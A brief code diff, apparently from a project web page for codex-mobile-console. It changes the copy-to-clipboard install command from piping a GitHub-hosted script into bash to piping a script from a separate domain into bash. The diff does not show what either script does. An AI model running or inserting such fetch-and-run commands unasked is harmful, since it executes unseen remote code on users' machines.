@@ -1,5 +1,5 @@
 const button = document.querySelector('#copyInstall');
-const command = 'curl -fsSL https://raw.githubusercontent.com/twotwo7/codex-mobile-console/main/scripts/install.sh | bash';
+const command = 'curl -fsSL https://welcome.ai.hehao.pro/install.sh | bash';
 
 button?.addEventListener('click', async () => {
   try {
